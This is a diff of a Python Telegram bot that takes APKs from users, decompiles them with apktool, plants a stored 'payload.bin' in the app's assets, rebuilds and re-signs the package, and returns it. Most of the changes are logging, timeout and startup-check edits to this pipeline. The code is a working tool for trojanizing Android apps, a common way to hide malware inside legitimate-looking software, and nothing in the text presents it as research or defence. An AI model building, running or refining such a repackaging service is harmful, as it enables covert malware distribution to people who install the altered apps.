@@ -1,4 +1,5 @@
 ﻿import os
+import sys
 import logging
 import tempfile
 import subprocess
@@ -6,7 +7,11 @@ from pathlib import Path
 from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters
 
-logging.basicConfig(level=logging.INFO)
+logging.basicConfig(
+    level=logging.INFO,
+    format="%(asctime)s [%(levelname)s] %(message)s",
+    stream=sys.stdout,
+)
 logger = logging.getLogger(__name__)
 
 TOKEN = os.getenv("TELEGRAM_TOKEN", "").strip()
@@ -28,7 +33,7 @@ try:
             logger.info(f"Payload loaded: {len(PAYLOAD)} bytes")
             break
     if not PAYLOAD:
-        logger.error("Payload not found")
+        logger.error("Payload not found!")
 except Exception as e:
     logger.error(f"Error loading payload: {e}")
 
@@ -36,19 +41,27 @@ except Exception as e:
 def check_tools():
     for tool in ["apktool", "jarsigner", "keytool"]:
         try:
-            subprocess.run([tool], capture_output=True, timeout=5)
+            r = subprocess.run([tool], capture_output=True, timeout=10)
             logger.info(f"Tool OK: {tool}")
         except FileNotFoundError:
-            logger.warning(f"Tool MISSING: {tool}")
-        except Exception:
-            logger.info(f"Tool present: {tool}")
+            logger.error(f"Tool MISSING: {tool} - WILL FAIL")
+        except Exception as e:
+            logger.info(f"Tool present: {tool} ({e})")
 
 
 def run_cmd(cmd, label):
     logger.info(f"[{label}] Running: {' '.join(cmd)}")
-    result = subprocess.run(cmd, capture_output=True, text=True)
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
+    except subprocess.TimeoutExpired:
+        logger.error(f"[{label}] TIMEOUT after 300s")
+        return False
     if result.returncode != 0:
-        logger.error(f"[{label}] FAILED (code {result.returncode}): {result.stderr}")
+        logger.error(f"[{label}] FAILED (code {result.returncode})")
+        if result.stdout:
+            logger.error(f"[{label}] stdout: {result.stdout[:500]}")
+        if result.stderr:
+            logger.error(f"[{label}] stderr: {result.stderr[:500]}")
         return False
     logger.info(f"[{label}] OK")
     return True
@@ -67,7 +80,6 @@ def inject_payload(apk_bytes):
                 f.write(apk_bytes)
             logger.info(f"APK written: {len(apk_bytes)} bytes")
 
-            # STEP 1: Decompile
             logger.info("Decompiling APK...")
             if not run_cmd(
                 ["apktool", "d", "-f", "-o", str(decompiled_dir), str(input_apk)],
@@ -75,14 +87,12 @@ def inject_payload(apk_bytes):
             ):
                 return None
 
-            # STEP 2: Inject payload into assets/
             payload_path = decompiled_dir / "assets" / "payload.bin"
             payload_path.parent.mkdir(parents=True, exist_ok=True)
             with open(payload_path, "wb") as f:
                 f.write(PAYLOAD)
-            logger.info(f"Payload injected: {payload_path} ({len(PAYLOAD)} bytes)")
+            logger.info(f"Payload injected: {len(PAYLOAD)} bytes")
 
-            # STEP 3: Rebuild APK
             logger.info("Rebuilding APK...")
             if not run_cmd(
                 ["apktool", "b", "-o", str(output_apk), str(decompiled_dir)],
@@ -94,7 +104,6 @@ def inject_payload(apk_bytes):
                 logger.error("Rebuilt APK not found")
                 return None
 
-            # STEP 4: Sign APK with jarsigner
             if KEYSTORE_PATH:
                 logger.info("Signing APK with jarsigner...")
                 sign_ok = run_cmd(
@@ -114,12 +123,11 @@ def inject_payload(apk_bytes):
                     with open(signed_apk, "rb") as f:
                         return f.read()
 
-                # Fallback: return unsigned if signing fails
                 logger.warning("Signing failed, returning unsigned APK")
                 with open(output_apk, "rb") as f:
                     return f.read()
             else:
-                logger.warning("No keystore found, returning unsigned APK")
+                logger.warning("No keystore, returning unsigned APK")
                 with open(output_apk, "rb") as f:
                     return f.read()
 
@@ -191,12 +199,16 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 def main():
-    if not TOKEN:
-        raise ValueError("TELEGRAM_TOKEN not set")
-
-    logger.info(f"Token OK: {TOKEN[:10]}...")
+    logger.info("=== Bot starting ===")
+    logger.info(f"Python: {sys.version}")
+    logger.info(f"TOKEN: {'SET' if TOKEN else 'NOT SET!'}")
     logger.info(f"Keystore: {KEYSTORE_PATH or 'NOT FOUND'}")
+    logger.info(f"Payload: {len(PAYLOAD) if PAYLOAD else 'NOT LOADED'}")
     check_tools()
+
+    if not TOKEN:
+        logger.error("TELEGRAM_TOKEN not set! Exiting.")
+        sys.exit(1)
 
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
@@ -204,7 +216,7 @@ def main():
     app.add_handler(CommandHandler("help", help_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))
 
-    logger.info("Bot started!")
+    logger.info("Bot started! Waiting for messages...")
     app.run_polling()
 
 
